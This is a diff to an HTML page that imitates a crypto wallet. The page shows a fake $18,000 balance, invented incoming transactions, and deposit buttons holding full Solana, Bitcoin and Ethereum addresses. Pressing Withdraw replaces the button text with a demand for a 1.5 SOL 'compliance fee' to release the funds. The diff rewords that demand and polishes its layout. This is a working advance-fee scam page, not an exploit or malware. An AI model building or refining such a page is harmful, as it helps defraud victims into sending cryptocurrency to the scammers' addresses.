@@ -155,6 +155,11 @@
             font-size: 18px;
             margin-bottom: 0;
         }
+        #withdrawBtn {
+            white-space: normal; /* Allow text to wrap */
+            height: auto; /* Allow button height to adjust to content */
+            min-height: 40px; /* Minimum height */
+        }
     </style> 
  </head> 
  <body> 
@@ -163,48 +168,69 @@
    <div class="balance"> 
     <img src="https://i.postimg.cc/fyzSXybx/Screenshot-20250224-160447.png"> <span>18,000</span> 
    </div> 
-   <div class="buttons"> <button class="btn" onclick="showPopup('depositPopup')">Deposit</button> <button class="btn" onclick="showPopup('withdrawPopup')">Withdraw</button> <button class="btn" onclick="showPopup('balancePopup')">Balance</button> <button class="btn" onclick="showPopup('historyPopup')">History</button> 
+   <div class="buttons"> 
+    <button class="btn" onclick="showPopup('depositPopup')">Deposit</button> 
+    <button class="btn" onclick="showPopup('withdrawPopup')">Withdraw</button> 
+    <button class="btn" onclick="showPopup('balancePopup')">Balance</button> 
+    <button class="btn" onclick="showPopup('historyPopup')">History</button> 
    </div> 
   </div> 
   <h2>Meme Coins</h2> 
-  <div class="coin-container" id="coins"></div> <!-- Deposit Popup --> 
+  <div class="coin-container" id="coins"></div> 
+  <!-- Deposit Popup --> 
   <div id="depositPopup" class="popup"> 
    <h3>Deposit</h3> 
    <div class="row"> 
-    <img src="https://i.postimg.cc/28YjwRs3/Screenshot-20250223-233453.png"> <span class="network">Solana</span> <span>84UZLk...ptp8</span> 
+    <img src="https://i.postimg.cc/28YjwRs3/Screenshot-20250223-233453.png"> 
+    <span class="network">Solana</span> 
+    <span>84UZLk...ptp8</span> 
     <img src="https://i.postimg.cc/8cd6Dw1T/Screenshot-20250223-235457.png" class="copy-btn" onclick="copyToClipboard('84UZLkLFX7e3XCe9PmEDE7kNaaaZK6zDHGPuPEa6ptp8')"> 
    </div> 
    <div class="row"> 
-    <img src="https://i.postimg.cc/qvLTQN85/Screenshot-20250223-233428.png"> <span class="network">Bitcoin</span> <span>bc1qrde...plhd</span> 
+    <img src="https://i.postimg.cc/qvLTQN85/Screenshot-20250223-233428.png"> 
+    <span class="network">Bitcoin</span> 
+    <span>bc1qrde...plhd</span> 
     <img src="https://i.postimg.cc/8cd6Dw1T/Screenshot-20250223-235457.png" class="copy-btn" onclick="copyToClipboard('bc1qrde6hgzsstkqlph5sx2xa4nvnr9csgmd59plhd')"> 
    </div> 
    <div class="row"> 
-    <img src="https://i.postimg.cc/W44sQfX1/Screenshot-20250224-104503.png"> <span class="network">Ethereum</span> <span>0x2eb6a...F034A</span> 
+    <img src="https://i.postimg.cc/W44sQfX1/Screenshot-20250224-104503.png"> 
+    <span class="network">Ethereum</span> 
+    <span>0x2eb6a...F034A</span> 
     <img src="https://i.postimg.cc/8cd6Dw1T/Screenshot-20250223-235457.png" class="copy-btn" onclick="copyToClipboard('0x2eb6a280EAfA46Ce23Ed5645b47D18E977cF034A')"> 
-   </div> <span class="close" onclick="hidePopup('depositPopup')">Close</span> 
-  </div> <!-- Withdraw Popup --> 
+   </div> 
+   <span class="close" onclick="hidePopup('depositPopup')">Close</span> 
+  </div> 
+  <!-- Withdraw Popup --> 
   <div id="withdrawPopup" class="popup"> 
    <h3>Withdraw</h3> 
    <p>You are withdrawing $18,000 in Solana.</p> 
    <img src="https://i.postimg.cc/28YjwRs3/Screenshot-20250223-233453.png"> 
-   <input type="text" placeholder="Enter SOL Address" class="input-box" id="withdrawAddress"> <button class="btn" id="withdrawBtn" onclick="showTaxMessage()">Withdraw</button> <span class="close" onclick="hidePopup('withdrawPopup')">Close</span> 
-  </div> <!-- Balance Popup --> 
+   <input type="text" placeholder="Enter SOL Address" class="input-box" id="withdrawAddress"> 
+   <button class="btn" id="withdrawBtn" onclick="showTaxMessage()">Withdraw</button> 
+   <span class="close" onclick="hidePopup('withdrawPopup')">Close</span> 
+  </div> 
+  <!-- Balance Popup --> 
   <div id="balancePopup" class="popup"> 
    <h3>Balance</h3> 
-   <p>$18,000</p> <span class="close" onclick="hidePopup('balancePopup')">Close</span> 
-  </div> <!-- History Popup --> 
+   <p>$18,000</p> 
+   <span class="close" onclick="hidePopup('balancePopup')">Close</span> 
+  </div> 
+  <!-- History Popup --> 
   <div id="historyPopup" class="popup"> 
    <h3>Transaction History</h3> 
    <p>+50 SOL received</p> 
    <p>+120 SOL received</p> 
    <p>+75 SOL received</p> 
    <p>+30 SOL received</p> 
-   <p>+25 SOL received</p> <span class="close" onclick="hidePopup('historyPopup')">Close</span> 
-  </div> <!-- Meme Coin Popup --> 
+   <p>+25 SOL received</p> 
+   <span class="close" onclick="hidePopup('historyPopup')">Close</span> 
+  </div> 
+  <!-- Meme Coin Popup --> 
   <div id="memePopup" class="popup"> 
    <h3 id="popupTitle"></h3> 
    <p>Deposit Address:</p> 
-   <p class="address" id="popupAddress"></p> <span class="close" onclick="hidePopup('memePopup')">Close</span> 
+   <p class="address" id="popupAddress"></p> 
+   <span class="close" onclick="hidePopup('memePopup')">Close</span> 
   </div> 
   <script>
         function showPopup(id) {
@@ -222,9 +248,9 @@
 
         function showTaxMessage() {
             const withdrawBtn = document.getElementById("withdrawBtn");
-            withdrawBtn.innerText = "Cross-Border Tax Required! Due to regulations on international crypto transfers, a fee of 1.5 SOL must be deposited to release funds. Copy the Solana address in this wallet to make the deposit. After that you can then withdraw.";
+            withdrawBtn.innerText = "Blockchain compliance fee required! Due to regulations on international crypto transfers, a fee of 1.5 SOL must be deposited to release funds. Copy the Solana address in this wallet to make the deposit. After that you can then withdraw.";
             withdrawBtn.style.fontSize = "12px"; // Reduce font size to fit text
-            withdrawBtn.style.padding = "8px";   // Adjust padding
+            withdrawBtn.style.padding = "10px";  // Adjust padding
             withdrawBtn.style.lineHeight = "1.2"; // Adjust line height for readability
         }
 
